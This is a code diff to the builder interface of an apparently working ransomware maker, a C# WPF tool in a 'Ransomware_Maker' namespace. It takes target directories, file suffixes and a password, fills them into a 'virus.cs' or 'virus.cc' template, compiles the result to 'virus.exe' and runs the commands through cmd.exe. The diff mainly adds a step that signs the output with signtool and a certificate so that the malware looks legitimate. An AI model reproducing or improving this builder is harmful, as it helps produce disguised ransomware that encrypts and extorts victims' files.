@@ -18,9 +18,25 @@ namespace Ransomware_Maker.cs
         public MainWindow()
         {
             InitializeComponent();
-            if (!(File.Exists("virus.cc") || File.Exists("virus.cs")))
+            List<string> fileList = new List<string>
             {
-                MessageBox.Show("source code file not found.",Title,MessageBoxButton.OK,MessageBoxImage.Error);
+            "virus.cc",
+            "virus.cs",
+            "signtool.exe",
+            "test.pfx"
+            };
+            string? shutdown =null;
+            foreach (string filePath in fileList)
+            {
+                if (!File.Exists(filePath))
+                {
+                    shutdown = filePath;
+                    break;
+                }
+            }
+            if(!string.IsNullOrEmpty(shutdown))
+            {
+                MessageBox.Show($"source code file not found:  {shutdown}", Title, MessageBoxButton.OK, MessageBoxImage.Error);
                 Application.Current.Shutdown(1);
             }
         }
@@ -86,7 +102,8 @@ namespace Ransomware_Maker.cs
         }
         private void Rdb_cs_Checked(object sender, RoutedEventArgs e)
         {
-            if (chk_64bit.IsChecked == true) {
+            if (chk_64bit.IsChecked == true)
+            {
                 lbl_compiler.Content = GetCscCompiler("Framework64");
             }
             else
@@ -105,7 +122,7 @@ namespace Ransomware_Maker.cs
             string lang = rdb_cs.IsChecked == true ? "c#" : "c++";
             string suffix = lang == "c#" ? "cs" : "cc";
             string? path = GenerateCode(lang == "c#" ? "virus.cs" : "virus.cc", suffix);
-            if(path == null )
+            if (path == null)
             {
                 MessageBox.Show("An error occurred while generating the code", Title, MessageBoxButton.OK, MessageBoxImage.Error);
                 return;
@@ -117,7 +134,7 @@ namespace Ransomware_Maker.cs
                 "c#" => " /out:virus.exe ",
                 "c++" => " -o virus ",
             };
-            string cmd = $"{lbl_compiler.Content} {outputOption} {path} {AddArgv(lang,smallest)} ";
+            string cmd = $"{lbl_compiler.Content} {outputOption} {path} {AddArgv(lang, smallest)} ";
             // Clipboard.SetText(cmd);
             string result = ExecCmd(cmd);
             if (string.Empty == result)
@@ -128,11 +145,19 @@ namespace Ransomware_Maker.cs
                     Process.Start("explorer.exe", $"/select,virus.exe");
                     isPrompted = true;
                 }
+                if (chk_sign.IsChecked == true)
+                {
+                    string result2 = ExecCmd("cmd.exe /c signtool.exe sign /f test.pfx /p password /t http://timestamp.digicert.com /v virus.exe");
+                    if (!string.IsNullOrEmpty(result2))
+                    {
+                        MessageBox.Show(result2, "Signature failed", MessageBoxButton.OK, MessageBoxImage.Error);
+                    }
+                }
             }
             else
 
             {
-                MessageBox.Show(result, Title, MessageBoxButton.OK, MessageBoxImage.Error);
+                MessageBox.Show(result, "Compilation failed", MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
         string AddArgv(string langType, bool smallest)
@@ -152,7 +177,7 @@ namespace Ransomware_Maker.cs
                     "c++" => " -s ",
                 };
             }
-            if (chk_64bit.IsChecked==true)
+            if (chk_64bit.IsChecked == true)
             {
                 result += langType switch
                 {
@@ -166,22 +191,22 @@ namespace Ransomware_Maker.cs
         }
 
         static string ExecCmd(string cmd)
-            {
-                ProcessStartInfo psi = new()
+        {
+            ProcessStartInfo psi = new()
 
-                {
-                    FileName = "cmd.exe",
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    Arguments = "/c " + cmd
-                };
+            {
+                FileName = "cmd.exe",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                Arguments = "/c " + cmd
+            };
 
             using Process process = new();
             process.StartInfo = psi;
             process.Start();
-            string output =process.StandardOutput.ReadToEnd().Trim()+process.StandardError.ReadToEnd().Trim();
+            string output = process.StandardOutput.ReadToEnd().Trim() + process.StandardError.ReadToEnd().Trim();
             process.WaitForExit();
             if (process.ExitCode != 0)
             {
@@ -190,7 +215,7 @@ namespace Ransomware_Maker.cs
             return string.Empty;
         }
 
-        private string? GenerateCode(string path,string suffix)
+        private string? GenerateCode(string path, string suffix)
         {
             string data = "";
             try
@@ -208,11 +233,11 @@ namespace Ransomware_Maker.cs
 
             string encryptedSuffixes = tbox_suffix.Text;
             string password = tbox_password.Text;
-            string input = Microsoft.VisualBasic.Interaction.InputBox("Please fill in the path group to be encrypted (like c:/path,d:/path)","","c:/");
+            string input = Microsoft.VisualBasic.Interaction.InputBox("Please fill in the path group to be encrypted (like c:/path,d:/path)", "", "c:/");
 
             if (string.IsNullOrEmpty(input))
             {
-                MessageBox.Show("Path cannot be empty", Title ,MessageBoxButton.OK, MessageBoxImage.Error);
+                MessageBox.Show("Path cannot be empty", Title, MessageBoxButton.OK, MessageBoxImage.Error);
                 return null;
             }
             string[] directories = input.Split(",");
@@ -263,9 +288,10 @@ namespace Ransomware_Maker.cs
 
         private void Chk_64bit_Unchecked(object sender, RoutedEventArgs e)
         {
-            if(rdb_cs.IsChecked==true)
+            if (rdb_cs.IsChecked == true)
                 lbl_compiler.Content = GetCscCompiler();
         }
+
 
     }
 
